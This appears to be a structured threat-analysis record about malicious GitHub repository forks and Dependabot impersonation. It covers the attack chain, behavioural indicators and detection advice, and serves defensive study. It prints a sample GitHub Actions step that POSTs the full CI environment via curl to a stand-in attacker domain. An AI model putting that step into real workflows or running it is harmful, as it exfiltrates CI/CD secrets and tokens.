package_info.package_name: Malicious GitHub Repo Forks / Dependabot Impersonation
package_info.package_manager: GitHub (source code repositories, not a traditional package manager)
package_info.why_malicious: Attackers clone legitimate repositories, inject malware loaders or credential-stealing code, and re-upload them under identical names with fake forks to increase legitimacy. In some cases, attackers use stolen GitHub tokens to impersonate trusted bots (e.g., Dependabot) and commit malicious code, aiming to exfiltrate sensitive data or inject further malware. This campaign targets the software supply chain by leveraging trusted repository names and automated workflows to distribute malicious payloads and steal secrets from CI/CD environments.

execution_context.trigger: commit-time (malicious commit to repository, code executes when repository is used or built)
execution_context.file_location: JavaScript files within cloned or forked repositories (e.g., src/index.js, lib/utils.js)
required_permissions: filesystem (to access environment variables and sensitive files)
network (to exfiltrate data via HTTPS requests)

malicious_snippets.code_behavior: At runtime when the infected repository is used, the code accesses environment variables (such as GITHUB_TOKEN) and sensitive data via getSensitiveData(), then sends this information in a JSON payload via HTTPS POST to an attacker-controlled domain, resulting in credential and secret exfiltration.

malice_analysis.why_suspicious: The code programmatically collects environment variables and sensitive data, then transmits them to an external, untrusted domain. This is a hallmark of credential theft and data exfiltration attacks.
malice_analysis.violated_expectations: Legitimate repository code should not access CI/CD secrets or environment variables and transmit them to external servers, especially not to domains unrelated to the project.
malice_analysis.similar_legitimate_use: Some telemetry or error reporting libraries may send anonymized, non-sensitive data to trusted domains for analytics or debugging, but never secrets or tokens.
key_indicators: Direct access to process.env or secret-handling functions
Network requests (fetch, XMLHttpRequest, axios, etc.) to hardcoded, untrusted domains
Presence of undocumented or obfuscated code blocks in core JavaScript files
References to sensitive environment variables (e.g., GITHUB_TOKEN, NPM_TOKEN)

execution_context.trigger: CI/CD pipeline execution (GitHub Actions workflow triggered by pull request or commit)
execution_context.file_location: .github/workflows/malicious.yml (malicious workflow file added or modified in repository)
required_permissions: network (to send HTTP requests to external domains)
environment_vars (to access all environment variables and secrets available in the CI/CD context)

malicious_snippets.code_snippet:
steps:
  - name: Exfiltrate secrets
    run: |
      curl -X POST -d "$(env)" https://malicious-domain.com/ci-secrets
malicious_snippets.code_behavior: During CI/CD pipeline execution, the workflow script enumerates all environment variables (including secrets) using the env command, then exfiltrates the entire environment via HTTP POST to an attacker-controlled domain, resulting in the theft of CI/CD secrets and credentials.

malice_analysis.why_suspicious: The workflow step collects all environment variables, including sensitive secrets, and sends them to an external, untrusted domain using curl. This is a direct and overt method of exfiltrating secrets from CI/CD pipelines.
malice_analysis.violated_expectations: Legitimate CI/CD workflows may use secrets for deployment or notifications, but should never transmit the full environment or secrets to external, untrusted endpoints.
malice_analysis.similar_legitimate_use: Workflows may send build status or logs to trusted internal endpoints or monitoring services, but never the full environment or secrets to unknown domains.
key_indicators: Use of curl or wget to send data to external, non-project domains in workflow scripts
Dumping or enumerating environment variables (env, printenv) in workflow steps
Addition or modification of workflow files (.github/workflows/*.yml) with undocumented or suspicious steps
Outbound HTTP POST requests containing environment variable dumps

attack_chain.action: Attacker clones legitimate repositories and injects malicious code or workflow files (such as JavaScript credential stealers or malicious GitHub Actions workflows).
attack_chain.leads_to: Malicious code and workflows are committed and uploaded to GitHub under the same or similar repository names, making them appear legitimate.

attack_chain.action: Attacker creates thousands of fake forks or repositories with identical or near-identical names to increase the appearance of legitimacy and visibility.
attack_chain.leads_to: Victims are more likely to trust, clone, or integrate the infected repositories due to their apparent popularity and legitimacy.

attack_chain.action: Victims use, clone, or integrate the infected repositories, triggering the execution of malicious code or CI/CD workflows.
attack_chain.leads_to: Sensitive data, such as environment variables, secrets, and tokens, are exfiltrated to attacker-controlled infrastructure.

behavioral_signatures: Repository code or CI/CD workflows accessing environment variables or secrets and transmitting them to external, untrusted domains
Unusual or undocumented network requests (e.g., fetch, curl, wget) in repository code or workflow scripts
Sudden addition or modification of workflow files (.github/workflows/*.yml) with steps that enumerate or transmit environment variables
Large-scale forking or creation of repositories with identical or near-identical names and minor code changes
file_indicators: .github/workflows/*.yml files containing steps that use curl or wget to send data to external domains
JavaScript files (e.g., index.js, utils.js) with fetch or other network functions targeting untrusted domains
Presence of new or modified workflow files in previously trusted repositories
References to sensitive environment variables (e.g., GITHUB_TOKEN, NPM_TOKEN) in code or workflow scripts
network_indicators: Outbound HTTP/HTTPS requests from CI/CD environments to domains not associated with the project (e.g., https://malicious-domain.com/steal, https://malicious-domain.com/ci-secrets)
POST requests containing environment variable dumps or credential data
Connections to known malicious exfiltration endpoints as identified in threat intelligence feeds
detection_knowledge.how_to_detect: Continuously monitor for new or modified workflow files and repository code that access secrets or environment variables and transmit data to external domains. Flag repositories exhibiting sudden, large-scale forking or identical naming patterns. Use network monitoring in CI/CD environments to detect outbound HTTP/HTTPS requests to untrusted or known malicious domains, especially those containing environment variable dumps or credential data. Implement automated scanning for suspicious workflow steps and code patterns indicative of credential exfiltration.
